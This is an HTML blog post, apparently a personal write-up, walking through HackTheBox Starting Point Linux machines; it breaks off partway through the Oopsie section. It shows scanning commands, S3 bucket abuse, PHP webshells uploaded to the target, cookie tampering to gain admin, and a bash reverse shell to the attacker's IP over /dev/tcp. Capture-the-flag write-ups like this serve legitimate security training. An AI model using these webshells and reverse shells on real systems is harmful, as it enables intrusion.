@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ThreeEnumeration123456789101112131415161718└─$ rustscan -a 10.129.208.197  --ulimit 5000...PORT   STATE SERVICE REASON22&#x2F;tcp open  ssh     syn-ack ttl 6380&#x2F;tcp open  http    syn-ack ttl 63└─$ nmap 10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Starting Point (Linux)">
+<meta property="og:url" content="http://example.com/2025/05/02/HTB-Starting-Point-Linux/index.html">
+<meta property="og:site_name" content="wang&#39;s blog">
+<meta property="og:description" content="ThreeEnumeration123456789101112131415161718└─$ rustscan -a 10.129.208.197  --ulimit 5000...PORT   STATE SERVICE REASON22&#x2F;tcp open  ssh     syn-ack ttl 6380&#x2F;tcp open  http    syn-ack ttl 63└─$ nmap 10.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJVmP9LEkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryVov98NJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1isO5LV1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkssWi8E1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1zOtj8VJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk_0FoU4Je.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1gL9s8V1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkId9sIEyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyKCaJoEJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ_wgeoVye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkqgDyC4Jl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1AND1RNJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy2d5yRNJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy_69kRVJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkKmokRVye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyQQJxRNye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJWXZeAVyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1ssgl0Vyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1ucWe0Vyg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk6CrlAVJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJcAUlRV1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk5S3y1B1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyWUBlyrJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByhjhekBkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJQElbkrJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy5de-yBye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJmPXbyBkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Syd_X-1Syx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJVC9byHyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyUgoW1Hkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk5XtY-Byx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJX3iKZBJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkAk3F-r1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkCuTYbH1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkE1AF-ryx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByFh-5-Skg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJdpWc-BJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyxiScZHJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJktS5-r1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1yVUcbH1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJDgPc-H1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1o_r2MBJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyieB3zB1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry8BQWNHke.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SygAf-4BJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1wjPMVByg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByofI7VBJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry5BImVS1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Skk5D7VrJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyXiDm4SJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1nTvm4B1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hy79_XNHJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1hQBNNrkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hke1y8Brkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJdGJ8Br1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJkfl8Brye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1KQnLrHkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sky5n8SBkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJPctvrSJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkO7lpHHyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ2FLkuBkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByueOk_ryl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rylzZ_1Orkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJoZylOByg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkSwQe_SJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1VfHedSJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryKuVb_SJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJLRVZ_ryl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1aiBW_rJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1rHU-_HJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/By3PI-_BJl.png">
+<meta property="article:published_time" content="2025-05-02T14:04:43.000Z">
+<meta property="article:modified_time" content="2025-05-02T14:05:23.692Z">
+<meta property="article:author" content="wang">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BJVmP9LEkl.png">
+    
+    
+    <!-- title -->
+    <title>HTB Starting Point (Linux)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/02/SunshineCTF-2024-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&text=HTB Starting Point (Linux)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&is_video=false&description=HTB Starting Point (Linux)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Linux)&body=Check out this article: http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&name=HTB Starting Point (Linux)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&t=HTB Starting Point (Linux)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Three"><span class="toc-number">1.</span> <span class="toc-text">Three</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S3-bucket"><span class="toc-number">1.2.</span> <span class="toc-text">S3 bucket</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oopsie"><span class="toc-number">2.</span> <span class="toc-text">Oopsie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">2.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold"><span class="toc-number">2.2.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">2.3.</span> <span class="toc-text">Lateral Movement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.4.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vaccine"><span class="toc-number">3.</span> <span class="toc-text">Vaccine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-2"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold-1"><span class="toc-number">3.2.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-1"><span class="toc-number">3.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unified"><span class="toc-number">4.</span> <span class="toc-text">Unified</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-3"><span class="toc-number">4.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">4.2.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-2"><span class="toc-number">4.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Starting Point (Linux)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-02T14:04:43.000Z" class="dt-published" itemprop="datePublished">2025-05-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ rustscan -a 10.129.208.197  --ulimit 5000</span><br><span class="line">...</span><br><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63</span><br><span class="line">80/tcp open  http    syn-ack ttl 63</span><br><span class="line"></span><br><span class="line">└─$ nmap 10.129.208.197 -p 22,80 -sC -sV</span><br><span class="line">...</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)</span><br><span class="line">|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)</span><br><span class="line">|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Toppers</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>瀏覽器開 10.129.208.197<br>在CONTACT發現<br><img src="https://hackmd.io/_uploads/BJVmP9LEkl.png" alt="image"><br><img src="https://hackmd.io/_uploads/ryVov98NJe.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &quot;10.129.208.197 thetoppers.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ gobuster vhost -u http://thetoppers.htb:80 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1isO5LV1l.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &quot;10.129.208.197 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts </span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rkssWi8E1x.png" alt="image"></p>
+<h3 id="S3-bucket"><a href="#S3-bucket" class="headerlink" title="S3 bucket"></a>S3 bucket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo apt install awscli </span><br><span class="line"></span><br><span class="line">└─$ aws configure</span><br><span class="line">AWS Access Key ID [None]: test</span><br><span class="line">AWS Secret Access Key [None]: test</span><br><span class="line">Default region name [None]: test</span><br><span class="line">Default output format [None]: test</span><br><span class="line"></span><br><span class="line">└─$ aws --endpoint=http://s3.thetoppers.htb/  s3 ls             </span><br><span class="line">2024-12-10 22:33:35 thetoppers.htb</span><br><span class="line">└─$ aws --endpoint=http://s3.thetoppers.htb/  s3 ls s3://thetoppers.htb       </span><br><span class="line">                           PRE images/</span><br><span class="line">2024-12-10 22:33:35          0 .htaccess</span><br><span class="line">2024-12-10 22:33:36      11952 index.php</span><br></pre></td></tr></table></figure>
+<p>bucket <code>s3://thetoppers.htb</code> 就像 webroot<br>&#x3D;&gt; Apache server is using this S3 bucket as<br>storage<br>嘗試上傳webshell到 <code>s3://thetoppers.htb</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php</span><br><span class="line"></span><br><span class="line">└─$ aws --endpoint=http://s3.thetoppers.htb/  s3 cp ./shell.php s3://thetoppers.htb/</span><br><span class="line">upload: ./shell.php to s3://thetoppers.htb/shell.php </span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/S1zOtj8VJl.png" alt="image"><br><img src="https://hackmd.io/_uploads/Bk_0FoU4Je.png" alt="image"><br><img src="https://hackmd.io/_uploads/r1gL9s8V1g.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkId9sIEyx.png" alt="image"></p>
+<h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><img src="https://hackmd.io/_uploads/HyKCaJoEJl.png" alt="image"><br><img src="https://hackmd.io/_uploads/BJ_wgeoVye.png" alt="image"><br>用 Burp Suite 看有沒有login相關路徑<br><img src="https://hackmd.io/_uploads/SkqgDyC4Jl.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1AND1RNJe.png" alt="image"><br>Login as Guest<br>uploads 可能有攻擊面但需要admin<br><img src="https://hackmd.io/_uploads/Sy2d5yRNJl.png" alt="image"><br>看來要透過改cookie取得admin<br><img src="https://hackmd.io/_uploads/Sy_69kRVJl.png" alt="image"><br>id&#x3D;2 &#x3D;&gt; 1<br><img src="https://hackmd.io/_uploads/BkKmokRVye.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyQQJxRNye.png" alt="image"></p>
+<h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>上傳webshell<br><img src="https://hackmd.io/_uploads/HJWXZeAVyl.png" alt="image"><br><code>shell.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&#x27;; echo meow&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>猜路徑 &#x2F;uploads<br><img src="https://hackmd.io/_uploads/H1ssgl0Vyx.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1ucWe0Vyg.png" alt="image"><br>上傳 reverse shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.222/9001 0&gt;&amp;1&#x27;&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Hk6CrlAVJx.png" alt="image"><br>發現 user robert<br>取得 user flag <code>f2c74ee8db7983851ab2a96a44eb7981</code><br><img src="https://hackmd.io/_uploads/BJcAUlRV1g.png" alt="image"></p>
+<h3 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h3><p>www-data 不會有太多系統權限，但可以嘗試看 web 目錄、source code<br>之前URL <code>/cdn-cgi/login/admin.php</code> 先從這裡開始看<br><img src="https://hackmd.io/_uploads/Bk5S3y1B1g.png" alt="image"><br>admin.php 有多處SQL語法，都參數化查詢無法注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;db.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]===<span class="string">&quot;34322&quot;</span> || <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]===<span class="string">&quot;86575&quot;</span> || <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]===<span class="string">&quot;2233&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;content&quot;</span>]===<span class="string">&quot;branding&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;brandId&quot;</span>]!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select model,price from branding where id=?&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;brandId&quot;</span>]);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">        <span class="variable">$stmt</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$model</span>=<span class="variable">$stmt</span>[<span class="string">&quot;model&quot;</span>];</span><br><span class="line">        <span class="variable">$price</span>=<span class="variable">$stmt</span>[<span class="string">&quot;price&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Brand ID&lt;/th&gt;&lt;th&gt;Model&lt;/th&gt;&lt;th&gt;Price&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;brandId&quot;</span>].<span class="string">&#x27;&lt;td&gt;&#x27;</span>.<span class="variable">$model</span>.<span class="string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$price</span>.<span class="string">&#x27;&lt;/td&gt;&lt;/tr&gt;&lt;/table&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;content&quot;</span>]===<span class="string">&quot;clients&quot;</span>&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&quot;orgId&quot;</span>]!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select name,email from clients where id=?&quot;</span>);</span><br><span class="line">                        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;orgId&quot;</span>]);</span><br><span class="line">                        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">                        <span class="variable">$stmt</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">                        <span class="variable">$stmt</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">                        <span class="variable">$name</span>=<span class="variable">$stmt</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                        <span class="variable">$email</span>=<span class="variable">$stmt</span>[<span class="string">&quot;email&quot;</span>];</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Client ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span 